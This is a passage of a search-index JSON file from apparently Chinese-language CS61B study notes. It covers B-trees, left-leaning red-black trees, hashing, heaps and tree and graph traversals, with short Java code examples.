<li>\u56e0\u6b64\u7528<code>cat</code>\u6216<code>elf</code>\u66ff\u6362<code>dog</code>\u8282\u70b9\uff0c\u7136\u540e\u5220\u9664\u65e7\u7684<code>cat</code>\u6216<code>elf</code>\u8282\u70b9</li> <li>\u8fd9\u79cd\u65b9\u6cd5\u88ab\u79f0\u4e3a<code>Hibbard deletion</code></li> </ul> </li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec17_b-trees","title":"Lec.17 B-Trees","text":""},{"location":"cs61b%20notes/w1dsy2ew/#171_bst","title":"17.1 <code>BST</code>\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u7f3a\u70b9","text":"<ul> <li>\u5728\u6700\u597d\u60c5\u51b5\u4e0b\uff0c\u6811\u7684\u9ad8\u5ea6\u662f <code>\u0398(log\u2061\ud835\udc41)</code></li> <li>\u5728\u6700\u574f\u60c5\u51b5\u4e0b\uff0c\u6811\u7684\u9ad8\u5ea6\u662f <code>\u0398(\ud835\udc41)</code>\uff0c\u6b64\u65f6<code>BST</code>\u9000\u5316\u6210\u4e86\u4e00\u4e2a\u94fe\u8868</li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#172_b","title":"17.2 B\u6811\u7684\u4f7f\u7528","text":"<ul> <li>\u901a\u8fc7\u6839\u8282\u70b9\u7684\u5206\u5272\uff0c\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u88ab\u63a8\u5411\u4e0b\u4e00\u4e2a\u6df1\u5ea6</li> <li>\u5185\u90e8\u8282\u70b9\u4ee5\u53ca\u53f6\u8282\u70b9\u81ea\u8eab\u7684\u5206\u5272\u5219\u4e0d\u4f1a\u5f15\u8d77\u6df1\u5ea6\u7684\u53d8\u5316</li> <li>\u901a\u8fc7\u8bbe\u7f6e\u4e00\u4e2a\u5e38\u6570L\u6765\u7ea6\u675f\u6bcf\u4e2a\u8282\u70b9\u4e2d\u6700\u591a\u5305\u542b\u7684\u9879\u76ee\u6570\u91cf</li> <li>\u6bcf\u4e2a\u8282\u70b9\u9650\u5236\u4e3a3\u4e2a\u9879\u76ee\u7684B\u6811\u4e5f\u79f0\u4e3a2-3-4\u6811\u62162-4\u6811(\u4e00\u4e2a\u8282\u70b9\u53ef\u4ee5\u67092\u30013\u62164\u4e2a\u5b50\u8282\u70b9)</li> <li>\u8bbe\u7f6e\u6bcf\u4e2a\u8282\u70b92\u4e2a\u9879\u76ee\u7684B\u6811\u662f2-3\u6811</li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#173_b","title":"17.3 B\u6811\u7684\u4e0d\u53d8\u91cf","text":"<ul> <li>\u6240\u6709\u53f6\u8282\u70b9\u5230\u6839\u8282\u70b9\u7684\u8ddd\u79bb\u76f8\u540c(\u6df1\u5ea6\u4e00\u81f4)</li> <li>\u5177\u6709k\u4e2a\u9879\u76ee\u7684\u975e\u53f6\u8282\u70b9\u5fc5\u987b\u6070\u597d\u5177\u6709k+1\u4e2a\u5b50\u8282\u70b9</li> <li>\u8fd9\u4e24\u4e2a\u4e0d\u53d8\u91cf\u4fdd\u8bc1\u4e86B\u6811\u7684\u9ad8\u5ea6\u4e3a <code>logN</code></li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#174_b","title":"17.4 B\u6811\u7684\u6027\u80fd","text":"<ul> <li>B\u6811\u7684\u9ad8\u5ea6\u5728log<sub>L+1</sub>N\u5230log<sub>2</sub>N\u4e4b\u95f4\uff0c\u56e0\u6b64B\u6811\u7684\u6574\u4f53\u9ad8\u5ea6\u59cb\u7ec8\u4e3aB-Tree\u7684\u6574\u4f53\u9ad8\u5ea6\u59cb\u7ec8\u662f <code>\u0398(logN)</code></li> <li>\u5176\u4f59\u5982<code>contain``add</code>\u7b49\u64cd\u4f5c\u7684\u8fd0\u884c\u65f6\u95f4\u5747\u4e3a <code>\u0398(logN)</code></li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#lec18_red_black_trees","title":"Lec.18 <code>Red Black Trees</code>\u7ea2\u9ed1\u6811","text":""},{"location":"cs61b%20notes/w1dsy2ew/#181_rotating_trees","title":"18.1 Rotating Trees","text":"<ul> <li>rotateLeft(G)\uff1a\u5c06<code>G</code>\u7684\u53f3\u5b50\u8282\u70b9<code>x</code>\u53d8\u4e3a<code>G</code>\u7684\u65b0\u5de6\u5b50\u8282\u70b9</li> <li>rotateRight(G)\uff1a\u5c06<code>G</code>\u7684\u5de6\u5b50\u8282\u70b9<code>x</code>\u53d8\u4e3a<code>G</code>\u7684\u65b0\u53f3\u5b50\u8282\u70b9 </li> </ul> rotateLeft(G): \u5148\u5408\u5e76\u518d\u4f20\u9012 <ul> <li>\u901a\u8fc7\u6811\u7684\u65cb\u8f6c\uff0c\u80fd\u7f29\u77ed\u6216\u5ef6\u957f\u6811\u7684\u9ad8\u5ea6\uff0c\u540c\u65f6\u4fdd\u7559\u641c\u7d22\u6811\u7684\u5c5e\u6027</li> </ul> <pre><code>// \u53f3\u65cb\u8f6c\u64cd\u4f5c\nprivate Node rotateRight(Node h) {\n    // \u65ad\u8a00h\u4e0d\u4e3a\u7a7a\u4e14h\u7684\u5de6\u5b50\u8282\u70b9\u4e3a\u7ea2\u8272\n    // assert (h != null) &amp;&amp; isRed(h.left);\n    Node x = h.left; // \u5c06h\u7684\u5de6\u5b50\u8282\u70b9x\u4fdd\u5b58\n    h.left = x.right; // \u5c06x\u7684\u53f3\u5b50\u8282\u70b9\u8bbe\u4e3ah\u7684\u5de6\u5b50\u8282\u70b9\n    x.right = h; // \u5c06h\u8bbe\u4e3ax\u7684\u53f3\u5b50\u8282\u70b9\n    return x; // \u8fd4\u56de\u65b0\u7684\u6839\u8282\u70b9x\n}\n\n// \u5c06\u53f3\u503e\u94fe\u63a5\u53d8\u4e3a\u5de6\u503e\u94fe\u63a5\nprivate Node rotateLeft(Node h) {\n    // \u65ad\u8a00h\u4e0d\u4e3a\u7a7a\u4e14h\u7684\u53f3\u5b50\u8282\u70b9\u4e3a\u7ea2\u8272\n    // assert (h != null) &amp;&amp; isRed(h.right);\n    Node x = h.right; // \u5c06h\u7684\u53f3\u5b50\u8282\u70b9x\u4fdd\u5b58\n    h.right = x.left; // \u5c06x\u7684\u5de6\u5b50\u8282\u70b9\u8bbe\u4e3ah\u7684\u53f3\u5b50\u8282\u70b9\n    x.left = h; // \u5c06h\u8bbe\u4e3ax\u7684\u5de6\u5b50\u8282\u70b9\n    return x; // \u8fd4\u56de\u65b0\u7684\u6839\u8282\u70b9x\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#182_creating_left-leaning_red-black_trees_llrb","title":"18.2 Creating Left-leaning Red-black Trees (LLRB)","text":"<ol> <li><code>LLRB Tree</code>\u7684\u7279\u70b9<ul> <li>\u4e0e<code>2-3 Tree</code>\u5177\u6709\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb</li> <li>\u5728<code>LLRB Tree</code>\u4e2d\uff0c\u6ca1\u6709\u4efb\u4f55\u8282\u70b9\u5177\u6709\u4e24\u4e2a\u7ea2\u8272\u94fe\u63a5     <sub>\u7ea2\u8272\u94fe\u63a5(<code>Red Link</code>)\u4ee3\u8868\u4e24\u4e2a\u5b50\u8282\u70b9\u5728<code>2-3 Tree</code>\u4e2d\u662f\u4e00\u4e2a\u8282\u70b9\u7684\u4e00\u90e8\u5206</sub></li> <li>\u6240\u6709\u7684<code>Red Link</code>\u90fd\u662f\u5de6\u503e\u7684</li> <li>\u4ece\u6839\u5230\u53f6\u5b50\u7684\u6bcf\u6761\u8def\u5f84\u5177\u6709\u4e0e<code>2-3 Tree</code>\u76f8\u540c\u6570\u91cf\u7684\u9ed1\u8272\u94fe\u63a5</li> <li>\u9ad8\u5ea6\u4e0d\u8d85\u8fc7\u5bf9\u5e94<code>2-3 Tree</code>\u9ad8\u5ea6\u76842\u500d\u52a01</li> </ul> </li> <li>\u4ece<code>2-3 Tree</code>\u521b\u5efa<code>LLRB Tree</code>\u7684\u65b9\u6cd5<ul> <li>\u5bf9\u4e8e\u5177\u6709\u5c11\u4e8e\u6216\u7b49\u4e8e2\u4e2a\u5b50\u8282\u70b9\u7684\u8282\u70b9\uff0c\u4e0d\u4f5c\u6539\u53d8</li> <li>\u5bf9\u4e8e\u5177\u67093\u4e2a\u5b50\u8282\u70b9\u7684\u8282\u70b9\uff0c\u5c06\u5de6\u5143\u7d20\u4f5c\u4e3a\u53f3\u5143\u7d20\u7684\u5b50\u8282\u70b9(\u5de6\u503e)</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#183_inserting_nodes","title":"18.3 Inserting Nodes","text":"<ol> <li> <p>\u50cf\u63d2\u5165\u666e\u901a<code>BST</code>\u4e00\u6837\u63d2\u5165<code>LLRB</code>\uff0c\u82e5\u7834\u574f\u4e86\u4e0e<code>2-3 Tree</code>\u7684\u4e00\u5bf9\u4e00\u6620\u5c04\uff0c\u5219\u4f7f\u7528\u65cb\u8f6c\u5c06\u6811\u6062\u590d\u6210\u9002\u5f53\u7684\u7ed3\u6784</p> </li> <li> <p>\u53f3\u503e3\u8282\u70b9 (Left Leaning Violation)</p> <ul> <li>\u5411\u5de6\u65cb\u8f6c</li> <li>\u82e5\u539f\u672c\u5de6\u8282\u70b9\u4e5f\u5177\u6709<code>Red Link</code>\uff0c\u518d\u6309\u7167\u6700\u540e\u4e00\u79cd\u60c5\u51b5\u5904\u7406    </li> </ul> </li> <li> <p>\u5de6\u4fa7\u53cc\u91cd\u63d2\u5165(Incorrect 4 Node Violation)</p> <ul> <li>\u5982\u679c\u6709\u4e24\u4e2a\u8fde\u7eed\u7684\u5de6\u7ea2\u94fe\u63a5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u4e2a\u975e\u6cd5\u76844\u8282\u70b9\uff0c\u65cb\u8f6c\u53f3\u8282\u70b9\u4ee5\u4fee\u590d</li> <li>\u5148\u65cb\u8f6c\u521b\u5efa\u5305\u542b\u53f3\u503e\u7684\u8282\u70b9\uff0c\u518d\u6309\u7167\u6700\u540e\u4e00\u79cd\u60c5\u51b5\u5904\u7406 </li> </ul> </li> <li> <p>\u8282\u70b9\u6709\u4e24\u4e2a\u7ea2\u8272\u5b50\u8282\u70b9(Temporary 4 Node)</p> <ul> <li>\u901a\u8fc7\u7ffb\u8f6c\u6240\u6709\u8fde\u63a5\u5230\u8282\u70b9S\u7684\u8fb9\u7684\u989c\u8272\u6765\u89e3\u51b3\u975e\u6cd54\u8282\u70b9\u7684\u95ee\u9898</li> <li>\u8fd9\u76f8\u5f53\u4e8e\u5728<code>2-3 Tree</code>\u4e2d\u5411\u4e0a\u63a8\u4e2d\u95f4\u8282\u70b9</li> </ul> <p></p> <pre><code>private void flipColors(Node h) {\n    h.color = !h.color;\n    h.left.color = !h.left.color;\n    h.right.color = !h.right.color;\n}\n</code></pre> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#184_run_time_analysis","title":"18.4 Run Time Analysis","text":"<p>\u7531\u4e8e<code>LLRB Tree</code>\u4e0e<code>2-3 Tree</code>\u4e00\u4e00\u5bf9\u5e94\uff0c\u5e76\u4e14\u9ad8\u5ea6\u4e0d\u8d85\u8fc7\u5bf9\u5e94<code>2-3 Tree</code>\u9ad8\u5ea6\u76842\u500d\u52a01\uff0c\u56e0\u6b64\u64cd\u4f5c\u7684\u8fd0\u884c\u65f6\u95f4\u4e3a <code>log(N)</code></p> <pre><code>private Node put(Node h, Key key, Value val) {\n    // \u5982\u679c\u5f53\u524d\u8282\u70b9\u4e3a\u7a7a\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ea2\u8272\u8282\u70b9\u5e76\u8fd4\u56de\n    if (h == null) { return new Node(key, val, RED); }\n    // \u6bd4\u8f83\u65b0\u952e\u503c\u4e0e\u5f53\u524d\u8282\u70b9\u7684\u952e\u503c\n    int cmp = key.compareTo(h.key);\n    if (cmp &lt; 0)      { h.left  = put(h.left,  key, val); }\n    else if (cmp &gt; 0) { h.right = put(h.right, key, val); }\n    else              { h.val   = val;                    }\n    // \u5982\u679c\u5f53\u524d\u8282\u70b9\u7684\u53f3\u5b50\u8282\u70b9\u662f\u7ea2\u8272\uff0c\u800c\u5de6\u5b50\u8282\u70b9\u4e0d\u662f\u7ea2\u8272\uff0c\u5219\u8fdb\u884c\u5de6\u65cb\u8f6c\n    if (isRed(h.right) &amp;&amp; !isRed(h.left))      { h = rotateLeft(h);  }\n    // \u5982\u679c\u5f53\u524d\u8282\u70b9\u7684\u5de6\u5b50\u8282\u70b9\u662f\u7ea2\u8272\uff0c\u5e76\u4e14\u5de6\u5b50\u8282\u70b9\u7684\u5de6\u5b50\u8282\u70b9\u4e5f\u662f\u7ea2\u8272\uff0c\u5219\u5148\u8fdb\u884c\u53f3\u65cb\u8f6c\n    if (isRed(h.left)  &amp;&amp;  isRed(h.left.left)) { h = rotateRight(h); }\n    // \u5982\u679c\u5f53\u524d\u8282\u70b9\u7684\u5de6\u5b50\u8282\u70b9\u548c\u53f3\u5b50\u8282\u70b9\u90fd\u662f\u7ea2\u8272\uff0c\u5219\u8fdb\u884c\u989c\u8272\u7ffb\u8f6c\n    if (isRed(h.left)  &amp;&amp;  isRed(h.right))     { flipColors(h);      }\n    return h;\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#lec19_hashing","title":"Lec.19 Hashing","text":"<ol> <li>Hashing\uff1a\u5c06\u590d\u6742\u7684\u5bf9\u8c61(\u5982\u5b57\u7b26\u4e32)\u8f6c\u5316\u4e3a\u6570\u503c\u8868\u793a(\u5982\u6574\u6570)</li> <li>Hash Code\uff1a\u901a\u8fc7\u5b9e\u73b0<code>hashCode()</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u952e\u8f6c\u6362\u4e3a\u6574\u6570\u54c8\u5e0c\u503c</li> <li>\u4e3a\u4e86\u907f\u514d\u5185\u5b58\u6548\u7387\u95ee\u9898\uff0c\u53ef\u4ee5\u901a\u8fc7\u6a21\u8fd0\u7b97\u5c06\u54c8\u5e0c\u503c\u7f29\u5c0f\u5230\u5408\u9002\u7684\u8303\u56f4\u5185</li> <li>\u4f7f\u7528<code>Math.floorMod(key.hashCode(), array.length)</code>\u6765\u5b9a\u4f4d\u6570\u7ec4\u4e2d\u7684\u6b63\u786e\u7d22\u5f15</li> <li> <p>\"Valid\" &amp; \"Good\" Hashcodes     Valid (\u6709\u6548\u6027)\uff1a</p> <ul> <li>\u786e\u5b9a\u6027\uff1a\u4e24\u4e2a\u76f8\u7b49\u7684\u5bf9\u8c61\u5177\u6709\u76f8\u540c\u7684\u54c8\u5e0c\u7801\uff0c</li> <li>\u4e00\u81f4\u6027\uff1a\u540c\u4e00\u5bf9\u8c61\u7684\u54c8\u5e0c\u7801\u5728\u591a\u6b21\u8c03\u7528\u4e2d\u4fdd\u6301\u4e0d\u53d8 Good:</li> <li>\u5c3d\u53ef\u80fd\u5206\u5e03\u5728\u6240\u6709\u7684\u6574\u6570\u96c6\u5408\u4e2d <sub>\u9ed8\u8ba4\u7684\u54c8\u5e0c\u51fd\u6570\u4f7f\u7528\u5bf9\u8c61\u7684\u5185\u5b58\u5730\u5740\u4f5c\u4e3a\u54c8\u5e0c\u7801\uff0c\u8fd9\u901a\u5e38\u4f1a\u5f97\u5230\u826f\u597d\u7684\u5206\u5e03</sub></li> <li>\u8ba1\u7b97\u901f\u5ea6\u8f83\u5feb</li> </ul> </li> <li> <p>\u5904\u7406\u54c8\u5e0c\u51b2\u7a81\u7684\u65b9\u6cd5</p> <ol> <li>\u5916\u90e8\u94fe\u63a5(External Chaining)\uff1a\u901a\u8fc7\u5c06\u5177\u6709\u76f8\u540c\u54c8\u5e0c\u503c\u7684\u6240\u6709\u952e\u5b58\u50a8\u5728\u4e00\u4e2a\u96c6\u5408(\u5982\u94fe\u8868)\u4e2d\u6765\u89e3\u51b3\u51b2\u7a81<ul> <li>\u63d2\u5165\uff1a\u5c06\u5143\u7d20\u63d2\u5165\u5230\u54c8\u5e0c\u8868\u4e2d\u8ba1\u7b97\u51fa\u7684\u7d22\u5f15\u4f4d\u7f6e\uff0c\u5982\u679c\u8be5\u4f4d\u7f6e\u5df2\u7ecf\u6709\u5143\u7d20\uff0c\u5219\u5c06\u65b0\u5143\u7d20\u6dfb\u52a0\u5230\u8be5\u4f4d\u7f6e\u7684\u94fe\u8868\u4e2d</li> <li>\u67e5\u627e\uff1a\u9996\u5148\u8ba1\u7b97\u7d22\u5f15\u4f4d\u7f6e\uff0c\u7136\u540e\u904d\u5386\u8be5\u4f4d\u7f6e\u7684\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u5339\u914d\u7684\u5143\u7d20\u6216\u94fe\u8868\u672b\u5c3e</li> </ul> </li> <li>\u7ebf\u6027\u63a2\u6d4b(Linear Probing)\uff1a\u5c06\u51b2\u7a81\u7684\u952e\u5b58\u50a8\u5728\u6570\u7ec4\u7684\u5176\u4ed6\u4f4d\u7f6e potentially in the next open array space</li> </ol> </li> <li> <p>\u8c03\u6574\u54c8\u5e0c\u8868\u5927\u5c0f(\u4ece\u800c)\u63d0\u5347\u6027\u80fd</p> <ul> <li>\u8d1f\u8f7d\u56e0\u5b50(Load Factor)\uff1a\u63d2\u5165\u5143\u7d20\u7684\u6570\u91cf\u4e0e\u6570\u7ec4\u603b\u957f\u5ea6\u7684\u6bd4\u7387\uff0c\u4f5c\u4e3a\u662f\u5426\u9700\u8981\u8c03\u6574\u54c8\u5e0c\u8868\u5927\u5c0f\u7684\u91cf\u5ea6</li> <li> <p><code>Java</code>\u7684\u9ed8\u8ba4\u6700\u5927\u8d1f\u8f7d\u56e0\u5b50\u662f0.75</p> </li> <li> <p>\u5728\u63d2\u5165\u65b0\u5143\u7d20\u4e4b\u524d\uff0c\u68c0\u67e5\u5f53\u524d\u8d1f\u8f7d\u56e0\u5b50\u662f\u5426\u8d85\u8fc7\u6700\u5927\u8d1f\u8f7d\u56e0\u5b50</p> </li> <li>\u5982\u679c\u8d1f\u8f7d\u56e0\u5b50\u8d85\u8fc7\u6700\u5927\u8d1f\u8f7d\u56e0\u5b50\uff0c\u5219\u5c06\u5e95\u5c42\u6570\u7ec4\u957f\u5ea6\u52a0\u500d</li> <li>\u7531\u4e8e\u6570\u7ec4\u957f\u5ea6\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u9700\u8981\u91cd\u65b0\u8ba1\u7b97\u6240\u6709\u5143\u7d20\u7684\u7d22\u5f15\u4f4d\u7f6e\uff0c\u5e76\u5c06\u5b83\u4eec\u91cd\u65b0\u63d2\u5165\u5230\u65b0\u7684\u6570\u7ec4\u4e2d</li> <li>\u5c06\u65b0\u5143\u7d20\u63d2\u5165\u5230\u54c8\u5e0c\u8868\u4e2d</li> </ul> </li> <li> <p>\u5982\u679c\u7c7b\u8986\u76d6\u4e86<code>equals</code>\u65b9\u6cd5\uff0c\u90a3\u4e48\u4e5f\u5e94\u8be5\u4e00\u81f4\u5730\u8986\u76d6<code>hashCode</code>\u65b9\u6cd5</p> </li> <li>Mutable Types\u53ef\u53d8\u6570\u636e\u7c7b\u578b</li> <li>\u53ef\u53d8HashSet\u952e\uff1a\u539f\u5219\u4e0a\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a<code>HashSet&lt;List&gt;</code>\uff0c\u82e5\u5c06\u4e00\u4e2a<code>List</code>\u63d2\u5165\u5230<code>HashSet</code>\u4e2d\uff0c\u7136\u540e\u4fee\u6539\u8be5<code>List</code>\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9519\u8bef\u7ed3\u679c\u548c\u6570\u636e\u4e22\u5931(\u54c8\u5e0c\u7801\u53d1\u751f\u4e86\u6539\u53d8)</li> <li>\u56e0\u6b64\u6c38\u8fdc\u4e0d\u8981\u4fee\u6539\u7528\u4f5c\u952e\u7684\u5bf9\u8c61</li> <li>Immutable Types\u4e0d\u53ef\u53d8\u6570\u636e\u7c7b\u578b<ul> <li>\u4e0d\u53ef\u53d8\u6570\u636e\u7c7b\u578b\u5728\u5b9e\u4f8b\u5316\u540e\u4e0d\u80fd\u4ee5\u4efb\u4f55\u53ef\u89c2\u5bdf\u7684\u65b9\u5f0f\u66f4\u6539</li> <li>\u5982<code>Integer</code>\u3001<code>String</code>\u548c<code>Date</code></li> <li><code>final</code>\u5173\u952e\u5b57\uff1a<code>final</code>\u53d8\u91cf\u610f\u5473\u7740\u4ec5\u53ef\u4ee5\u8d4b\u503c\u4e00\u6b21(\u5728\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6216\u521d\u59cb\u5316\u5668\u4e2d)\uff0c\u4f46\u4e4b\u540e\u4e0d\u80fd\u66f4\u6539</li> <li><code>final</code>\u65e2\u4e0d\u662f\u4e0d\u53ef\u53d8\u7c7b\u7684\u5145\u5206\u6761\u4ef6\uff0c\u4e5f\u4e0d\u662f\u5fc5\u8981\u6761\u4ef6</li> <li>\u4f18\u70b9\uff1a\u4e0d\u53ef\u53d8\u7c7b\u7684\u7ed3\u679c\u603b\u662f\u76f8\u540c\u7684\uff0c\u65e0\u8bba\u4f55\u65f6\u8bbf\u95ee\uff0c\u964d\u4f4e\u4e86\u9519\u8bef\u53d1\u751f\u7684\u6982\u7387</li> <li>\u7f3a\u70b9\uff1a\u6bcf\u6b21\u66f4\u6539\u65f6\u5fc5\u987b\u521b\u5efa\u4e00\u4e2a\u65b0\u5bf9\u8c61\uff0c\u4f8b\u5982\uff0c\u5b57\u7b26\u4e32\u8fde\u63a5\u64cd\u4f5c\u5f88\u6162</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec20_heaps_and_pqs","title":"Lec.20 Heaps and PQs \u5806\u548c\u4f18\u5148\u961f\u5217","text":"<ol> <li> <p>\u4e8c\u53c9\u6700\u5c0f\u5806\u7684\u7279\u6027\uff1a\u5b8c\u5907<code>Complete</code> \u4e14\u9075\u5faa **\u6700\u5c0f\u5806\u7684\u5c5e\u6027<code>Min-heap Property</code></p> <ul> <li><code>Complete</code>\uff1a\u4ec5\u5728\u5e95\u90e8\u7f3a\u5c11\u8282\u70b9\uff0c\u5e76\u4e14\u6240\u6709\u8282\u70b9\u5e94\u8be5\u5c3d\u53ef\u80fd\u5de6\u503e</li> <li><code>Min-heap Property</code>\uff1a\u6bcf\u4e2a\u8282\u70b9\u90fd\u5c0f\u4e8e\u6216\u7b49\u4e8e\u5176\u5b50\u8282\u70b9</li> </ul> </li> <li> <p>\u6700\u5c0f\u5806\u7684\u64cd\u4f5c\uff1a</p> </li> <li> <p><code>add</code>\uff1a\u5c06\u65b0\u5143\u7d20\u6dfb\u52a0\u5230\u5806\u7684\u672b\u5c3e\uff0c\u7136\u540e\u4e0a\u6d6e\u4ee5\u7ef4\u62a4\u5806\u7684\u6027\u8d28</p> <pre><code>```java\n    public void insert(int value) {\n        heap.add(value); // \u5c06\u65b0\u5143\u7d20\u6dfb\u52a0\u5230\u5806\u7684\u672b\u5c3e\n        int index = heap.size() - 1;\n        while (index &gt; 0) {\n            int parentIndex = (index - 1) / 2;\n            if (heap.get(parentIndex) &gt;= heap.get(index)) {\n                break; // \u7236\u8282\u70b9\u5df2\u7ecf\u5927\u4e8e\u7b49\u4e8e\u5f53\u524d\u8282\u70b9\uff0c\u5806\u6027\u8d28\u6ee1\u8db3\n            }\n            // \u4ea4\u6362\u7236\u8282\u70b9\u548c\u5f53\u524d\u8282\u70b9\n            Collections.swap(heap, parentIndex, index);\n            index = parentIndex;\n        }\n    }\n```\n</code></pre> <ol> <li> <p><code>delete</code>\uff1a\u79fb\u9664\u5806\u9876\u5143\u7d20\uff0c\u5c06\u5806\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u79fb\u5230\u5806\u9876\uff0c\u7136\u540e\u4e0b\u6c89\u4ee5\u7ef4\u62a4\u5806\u7684\u6027\u8d28</p> <pre><code>public int removeMax() {\n    if (heap.size() == 0) {\n        throw new NoSuchElementException(\"Heap is empty\");\n    }\n    int maxValue = heap.get(0);\n    int lastValue = heap.remove(heap.size() - 1);\n    if (heap.size() &gt; 0) {\n        heap.set(0, lastValue);\n        heapifyDown(0);\n    }\n    return maxValue;\n}\n</code></pre> <pre><code>private void heapifyDown(int index) {\n    int leftChildIndex = 2 * index + 1;\n    int rightChildIndex = 2 * index + 2;\n    int largestIndex = index;\n\n    if (leftChildIndex &lt; heap.size() &amp;&amp; heap.get(leftChildIndex) &gt; heap.get(largestIndex)) {\n        largestIndex = leftChildIndex;\n    }\n    if (rightChildIndex &lt; heap.size() &amp;&amp; heap.get(rightChildIndex) &gt; heap.get(largestIndex)) {\n        largestIndex = rightChildIndex;\n    }\n    if (largestIndex != index) {\n        Collections.swap(heap, index, largestIndex);\n        heapifyDown(largestIndex);\n    }\n}\n</code></pre> </li> <li> <p>\u5982\u4f55\u627e\u5230\u7236\u8282\u70b9\u4e0e\u5b50\u8282\u70b9\uff1a(\u5728\u6570\u7ec4\u7684\u5f00\u5934\u7559\u4e00\u4e2a\u7a7a\u4f4d\u4ee5\u7b80\u5316\u8ba1\u7b97)</p> <pre><code>leftChild(k) = k * 2\nrightChild(k) = k * 2 + 1\nparent(k) = k / 2\n</code></pre> </li> </ol> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec21_tree_and_graph_traversals","title":"Lec.21 Tree and Graph Traversals","text":""},{"location":"cs61b%20notes/w1dsy2ew/#211_tree_recap","title":"21.1 Tree Recap","text":"<ol> <li>\u6811\u7684\u7ed3\u6784\uff1a\u7531\u8282\u70b9\u548c\u8fb9\u7ec4\u6210<ul> <li>\u8282\u70b9 (\u6216\u9876\u70b9) \u662f\u8fde\u63a5\u7684</li> <li>\u8fb9\u8fde\u63a5\u8282\u70b9\uff0c\u4e14\u4e0d\u80fd\u5f62\u6210\u73af</li> <li>\u4efb\u610f\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u6709\u4e14\u4ec5\u6709\u4e00\u6761\u8def\u5f84</li> </ul> </li> <li>\u6811\u7684\u5e94\u7528\uff1a\u641c\u7d22\u6811\u3001\u5806\u3001\u7ec4\u7ec7\u7ed3\u6784\u56fe\u7b49</li> <li>22.2 \u6811\u7684\u904d\u5386 <code>Tree Traversal</code></li> <li>\u5c42\u6b21\u904d\u5386 (\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff0c<code>BFS</code>)\uff1a\u6309\u5c42\u6b21\u4ece\u5de6\u5230\u53f3\u904d\u5386<code>Level Order Traversal</code></li> <li>\u6df1\u5ea6\u4f18\u5148\u904d\u5386(<code>DFS</code>)\uff1a\u5305\u62ec\u524d\u5e8f\u904d\u5386\u3001\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386</li> <li> <p>\u524d\u5e8f\u904d\u5386<code>Pre-order Traversal</code>\uff1a\u5148\u8bbf\u95ee\u6839\u8282\u70b9\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386\u5de6\u5b50\u6811\uff0c\u6700\u540e\u9012\u5f52\u904d\u5386\u53f3\u5b50\u6811</p> <pre><code>void preOrder(BSTNode x) {\n    if (x == null) return;\n    print(x.key);\n    preOrder(x.left);\n    preOrder(x.right);\n}\n</code></pre> </li> <li> <p>\u4e2d\u5e8f\u904d\u5386<code>In-order Traversal</code>:\u5148\u9012\u5f52\u904d\u5386\u5de6\u5b50\u6811\uff0c\u7136\u540e\u8bbf\u95ee\u6839\u8282\u70b9\uff0c\u6700\u540e\u9012\u5f52\u904d\u5386\u53f3\u5b50\u6811</p> <pre><code>void inOrder(BSTNode x) {\n    if (x == null) return;\n    inOrder(x.left);\n    print(x.key);\n    inOrder(x.right);\n}\n</code></pre> </li> <li> <p>\u540e\u5e8f\u904d\u5386<code>Post-order Traversal</code>:\u5148\u9012\u5f52\u904d\u5386\u5de6\u5b50\u6811\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386\u53f3\u5b50\u6811\uff0c\u6700\u540e\u8bbf\u95ee\u6839\u8282\u70b9</p> <pre><code>void postOrder(BSTNode x) {\n    if (x == null) return;\n    postOrder(x.left);\n    postOrder(x.right);\n    print(x.key);\n}\n</code></pre> </li> <li> <p>For human: \u7ed5\u7740\u6839\u8282\u70b9\u9006\u65f6\u9488\u8f6c</p> </li> <li><code>Pre-order Traversal</code>: \u4ece\u8282\u70b9\u5de6\u8fb9\u8fc7\u7684\u65f6\u5019\u53d6</li> <li><code>In-order Traversal</code>: \u4ece\u8282\u70b9\u4e0b\u9762\u8fc7\u7684\u65f6\u5019\u53d6</li> <li><code>Post-order Traversal</code>: \u4ece\u8282\u70b9\u53f3\u8fb9\u8fc7\u7684\u65f6\u5019\u53d6</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#212_graph","title":"21.2 Graph","text":"<ol> <li>\u56fe\u662f\u4e00\u79cd\u7531\u8282\u70b9\u548c\u8fb9\u7ec4\u6210\u7684\u7ed3\u6784</li> <li>\u6240\u6709\u6811\u90fd\u662f\u56fe\uff0c\u4f46\u4e0d\u662f\u6240\u6709\u56fe\u90fd\u662f\u6811</li> <li>\u7b80\u5355\u56fe\u548c\u591a\u91cd\u56fe<code>simple graphs and multigraphs</code>\uff1a\u7b80\u5355\u56fe\u6ca1\u6709\u591a\u91cd\u8fb9\u548c\u81ea\u73af\uff0c\u800c\u591a\u91cd\u56fe\u5141\u8bb8\u8fd9\u4e9b\u7ed3\u6784     <sub>CS61B\u53ea\u8ba8\u8bba\u7b80\u5355\u56fe</sub></li> <li>\u65e0\u5411\u56fe<code>undirected graphs</code>\u548c\u6709\u5411\u56fe<code>directed 